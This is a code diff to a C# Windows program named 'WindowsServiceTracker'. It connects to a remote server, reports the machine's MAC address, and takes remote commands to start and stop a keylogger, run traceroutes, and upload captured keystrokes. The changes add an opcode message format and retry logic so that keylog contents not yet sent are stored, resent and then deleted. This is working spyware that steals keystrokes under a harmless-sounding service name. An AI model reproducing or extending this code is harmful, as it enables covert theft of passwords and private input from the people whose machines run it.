@@ -31,6 +31,7 @@ namespace WindowsServiceTracker
         public const byte KEYLOG_OFF = 1;
         public const byte TRACE_ROUTE = 2;
         public const byte KEYLOG = 3;
+        public const byte NO_OP = 255;
         private const int PORT = 10011;
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
@@ -229,7 +230,7 @@ namespace WindowsServiceTracker
                         Connect();
                         waitToConnect = 0;
                         getTcpStream();
-                        SendStringMsg(macAddress);
+                        SendStdMsg(NO_OP, macAddress, true);
                     }
                     catch (Exception)
                     {
@@ -270,7 +271,7 @@ namespace WindowsServiceTracker
                                         StopKeylogger();
                                         break;
                                     case TRACE_ROUTE:
-                                        sendTraceRouteInfo();
+                                        SendStdMsg(TRACE_ROUTE, traceRoute(ipAddressString), true);
                                         break;
                                     case KEYLOG:
                                         sendKeylog();
@@ -332,32 +333,85 @@ namespace WindowsServiceTracker
             return true;
         }
 
-        /* Attempts to write the message passed in as an argument to the TCP Stream
+        /* Writes a message to the tcp connection. The format is
+         * <opcode><message><newline>
+         * A NO_OP opcode (255 or 0xFF) or msg that is null or empty will leave it out.
+         * If newLine is false, the newline will not be included at the end of the msg.
          */
-        private bool SendStringMsg(string stringMsg)
+        private bool SendStdMsg(byte opcode, byte[] msg, bool newLine) // todo first message to fail isn't detected, maybe send empty message first?
         {
-            if (tcpStream != null && tcpStream.CanWrite)
+            int msgSize = 0;
+            int offset = 0;
+            byte[] newLineBytes = Encoding.UTF8.GetBytes(Environment.NewLine);
+            byte[] combinedMsg;
+            try
             {
-                byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
-                tcpStream.Write(msg, 0, msg.Length);
-                return true;
+                if (opcode != NO_OP)
+                {
+                    msgSize += 1;
+                }
+
+                if (msg != null && msg.Length != 0)
+                {
+                    msgSize += msg.Length;
+                }
+
+                if (newLine == true)
+                {
+                    msgSize += newLineBytes.Length;
+                }
+
+                // incase there is nothing to send
+                if (msgSize == 0)
+                {
+                    return true;
+                }
+
+                combinedMsg = new byte[msgSize];
+
+                // assemble message into single array to be sent as a single unit
+                if (opcode != NO_OP)
+                {
+                    combinedMsg[offset] = opcode;
+                    offset += 1;
+                }
+
+                if (msg != null && msg.Length != 0)
+                {
+                    msg.CopyTo(combinedMsg, offset);
+                    offset += msg.Length;
+                }
+
+                if (newLine == true)
+                {
+                    newLineBytes.CopyTo(combinedMsg, offset);
+                    offset += newLineBytes.Length;
+                }
+
+                tcpStream.Write(combinedMsg, 0, combinedMsg.Length);
             }
-            return false;
+            catch (Exception)
+            {
+                return false;
+            }
+            return true;
         }
 
-        /* Performs a trace route and sends it over the current connection
-         * in the form <opcode>IP~IP~IP~...newline
+        /* Convenience method that converts a string message to a byte[] array
+         * before using sendStdMsg(byte opcode, byte[] msg) to send it.
          */
-        private bool sendTraceRouteInfo()
+        private bool SendStdMsg(byte opcode, String msg, bool newLine)
         {
-            String ipString = traceRoute(ipAddressString);
-            if (tcpStream != null && tcpStream.CanWrite)
+            byte[] byteMsg = null;
+            if (msg == null || msg.Length == 0)
             {
-                byte[] msg = Encoding.UTF8.GetBytes(TRACE_ROUTE + ipString + Environment.NewLine);
-                tcpStream.Write(msg, 0, msg.Length);
-                return true;
+                return SendStdMsg(opcode, byteMsg, newLine);
             }
-            return false;
+            else
+            {
+                byteMsg = Encoding.UTF8.GetBytes(msg + Environment.NewLine);
+                return SendStdMsg(opcode, byteMsg, newLine);
+            }
         }
 
         /* Performs a traceroute to the given address. Returns a string of
@@ -383,23 +437,28 @@ namespace WindowsServiceTracker
         }
 
         /* sends the contents of the keylog file to the server
-         * and deletes it.
+         * and deletes it. If unable to finish, it should store
+         * the remaining contents in a file file and attempt
+         * to send it first next time before sending the active
+         * file.
          */
         private bool sendKeylog()
         {
-            bool success = true;
+            bool successfulFileOpen = true;
             StreamReader log = null;
             String tempFile = "tempFile.txt";
-            int bufferSize = 1024;
-            char[] buffer = new char[bufferSize];
+            String storedFile = "storedFile.txt";
+            int readSize = 1024;
+            char[] buffer = new char[readSize];
             int bytesRead;
             byte[] msg;
             bool storedFileExists = false;
+            bool sentAllContent = false;
 
             // see if an unsent file exists
             try
             {
-                log = new StreamReader(tempFile);
+                File.Move(storedFile, tempFile);
                 storedFileExists = true;
             }
             catch (Exception)
@@ -411,55 +470,64 @@ namespace WindowsServiceTracker
                 try
                 {
                     File.Move(keyLogFilePath, tempFile);
-                    log = new StreamReader(tempFile);
                 }
                 catch (Exception)
                 {
-                    //return false;
+                    return SendStdMsg(KEYLOG, "", true);
                 }
             }
 
             try
             {
-
-                msg = new byte[1];
-                msg[0] = KEYLOG;
-                tcpStream.Write(msg, 0, msg.Length);
+                log = new StreamReader(tempFile);
 
                 // the nested try block is so that when there is no keylog file,
                 // it still sends the opcode and newline char
                 try
                 {
-                    while (!log.EndOfStream)
+                    bool lastSendSuccessful = true;
+                    while (!log.EndOfStream && lastSendSuccessful)
                     {
-                        bytesRead = log.Read(buffer, 0, bufferSize);
+                        bytesRead = log.Read(buffer, 0, readSize);
                         msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
-                        tcpStream.Write(msg, 0, msg.Length);
+                        lastSendSuccessful = SendStdMsg(KEYLOG, msg, true);
                     }
+                    sentAllContent = lastSendSuccessful;
                 }
                 catch (Exception)
+                { }
+
+                if (!sentAllContent)
                 {
-
+                    try
+                    {
+                        StreamWriter store = new StreamWriter(storedFile);
+                        store.Write(buffer, 0, buffer.Length);
+                        while (!log.EndOfStream)
+                        {
+                            store.Write(log.Read());
+                        }
+                        store.Close();
+                    }
+                    catch (Exception)
+                    { }
                 }
-
-                msg = Encoding.UTF8.GetBytes(Environment.NewLine);
-                tcpStream.Write(msg, 0, msg.Length);
             }
             catch (Exception)
             {
-                success = false;
+                successfulFileOpen = false;
             }
 
             try
             {
                 log.Close();
-                if (success)
+                File.Delete(tempFile);
+                if (successfulFileOpen && sentAllContent)
                 {
-                    File.Delete(tempFile);
                     // if we sent an old file, send new one now
-                    if (storedFileExists)
+                    if (storedFileExists && sentAllContent)
                     {
-                        sendKeylog();
+                        return sendKeylog();
                     }
                 }
             }
@@ -467,7 +535,7 @@ namespace WindowsServiceTracker
             {
                 //return false;
             }
-            return success;
+            return sentAllContent;
         }
     }
 }
